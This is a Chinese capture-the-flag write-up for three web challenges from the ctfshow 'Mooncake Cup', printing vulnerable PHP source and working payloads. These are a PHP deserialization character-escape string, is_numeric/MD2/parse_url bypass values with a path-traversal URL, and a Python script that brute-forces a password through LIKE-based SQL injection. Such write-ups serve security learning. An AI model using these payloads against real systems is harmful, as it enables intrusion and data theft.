# 原创
：  ctfshow-月饼杯

# ctfshow-月饼杯

#### web1_此夜圆

## web1_此夜圆

### 考点

> 
php反序列化字符逃逸


### 思路

> 
观察 index.php 代码，很容易发现是php反序列化字符逃逸中字符增多的考点，我们要将password的值变为`yu22x`，从而达到包含 flag.php 的目的，我们需要逃逸的部分为 `";s:8:"password";s:5:"yu22x";}`，长度为30，所以我们需要15个 `Firebasky`来达到逃逸这部分字符串的目的


### Payload

> 
index.php代码


```
&lt;?php
error_reporting(0);

class a
{
	public $uname;
	public $password;
	public function __construct($uname,$password)
	{
		$this-&gt;uname=$uname;
		$this-&gt;password=$password;
	}
	public function __wakeup()
	{
			if($this-&gt;password==='yu22x')
			{
				include('flag.php');
				echo $flag;	
			}
			else
			{
				echo 'wrong password';
			}
		}
	}

function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?&gt;

```

> 
Payload：<br/> `1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}`


## web2_故人心

### 考点

> 
is_numeric绕过、MD2绕过、parse_url绕过


### 思路

> 



### Payload

> 
源码


```
&lt;?php
error_reporting(0);
highlight_file(__FILE__);
$a=$_GET['a'];
$b=$_GET['b'];
$c=$_GET['c'];
$url[1]=$_POST['url'];
if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0){
    $d = ($b==hash("md2", $b)) &amp;&amp; ($c==hash("md2",hash("md2", $c)));
    if($d){
             highlight_file('hint.php');
             if(filter_var($url[1],FILTER_VALIDATE_URL)){
                $host=parse_url($url[1]);
                print_r($host); 
                if(preg_match('/ctfshow\.com$/',$host['host'])){
                    print_r(file_get_contents($url[1]));
                }else{
                    echo '差点点就成功了！';
                }
            }else{
                echo 'please give me url!!!';
            }     
    }else{
        echo '想一想md5碰撞原理吧?!';
    }
}else{
    echo '第一个都过不了还想要flag呀?!';
}

```

> 
Payload：


```
GET：?a=1e-162&amp;b=0e652024452&amp;c=0e603448399
POST：url=a://ctfshow.com/../../../../../../../fl0g.txt

```

## web3_莫负婵娟

### 考点

> 
like注入、Linux环境变量构造执行命令、通配符利用


### 思路

> 



### Payload

> 
like注入脚本


```
import requests
import string

strs = string.digits+string.ascii_letters
url = 'http://d274b648-0dad-4058-9b20-9a7a35424df5.chall.ctf.show/login.php'

pwd = ''
for i in range(32):
	print('i = '+str(i+1),end='\t')
	for j in strs:
		password = pwd + j + (31-i)*'_'
		data = {'username':'yu22x','password':password}
		r = requests.post(url,data=data)
		if 'wrong' not in r.text:
			pwd += j
			print(pwd)
			break


```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210615012229469.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021061501275390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210615012940782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
